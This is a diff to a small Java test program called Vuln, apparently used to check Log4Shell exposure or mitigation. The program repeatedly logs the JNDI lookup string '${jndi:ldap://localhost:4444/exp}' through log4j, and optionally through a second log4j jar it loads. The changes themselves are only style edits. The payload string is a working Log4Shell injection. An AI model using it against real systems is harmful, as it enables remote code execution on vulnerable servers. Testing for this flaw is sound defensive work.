@@ -6,9 +6,9 @@
  * to you under the Apache License, Version 2.0 (the
  * "License"); you may not use this file except in compliance
  * with the License.  You may obtain a copy of the License at
- * 
+ *
  *   http://www.apache.org/licenses/LICENSE-2.0
- * 
+ *
  * Unless required by applicable law or agreed to in writing,
  * software distributed under the License is distributed on an
  * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
@@ -28,14 +28,14 @@ import org.apache.logging.log4j.Logger;
 public class Vuln {
   private static final Logger logger = LogManager.getLogger(Vuln.class);
 
-  public static void main(String[] args) throws Exception {
-    String attackString = "${jndi:ldap://localhost:4444/exp}";
+  public static void main(final String[] args) throws Exception {
+    final String attackString = "${jndi:ldap://localhost:4444/exp}";
 
     if (args.length > 0) {
       new Thread(new Runnable() {
 	  public void run() {
 	    try {
-	      Thread.sleep(20_000);
+	      Thread.sleep(20000);
 	      System.out.println("--> Starting second logger");
 	      File jarFile = new File(args[0]);
 	      URLClassLoader loader = new URLClassLoader(new URL[]{jarFile.toURI().toURL()}, null);
@@ -46,7 +46,7 @@ public class Vuln {
 	      Object logger = getLogger.invoke(null, new Object[] { Vuln.class });
 	      while (true) {
 		error.invoke(logger, new Object[] { attackString });
-		Thread.sleep(1_000);
+		Thread.sleep(1000);
 	      }
 	    } catch (Exception e) {
 	      System.out.println(e);
@@ -57,7 +57,7 @@ public class Vuln {
 
     while (true) {
       logger.error(attackString);
-      Thread.sleep(1_000);
+      Thread.sleep(1000);
     }
   }
 }
